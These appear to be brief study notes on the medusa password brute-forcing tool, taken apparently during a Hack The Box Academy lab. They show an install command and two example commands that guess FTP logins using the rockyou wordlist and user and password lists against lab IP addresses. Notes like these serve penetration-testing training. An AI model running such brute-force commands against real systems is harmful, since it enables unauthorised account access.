medusa
#######

Date: 2024-11-29 08:57

Status:

Installation
***************

.. code-block:: console

   sudo apt install medusa

Usage
***********

Example 1: Brute forcing FTP

.. code-block:: console

    medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp

Example 2: Parallel connections with threads

.. code-block:: console

   medusa -U ./users.list -P ./pws.list -M ftp  -h 10.129.175.180 -n 2121 -v5 -L -t 11

References
**************
https://academy.hackthebox.com/module/116/section/1165
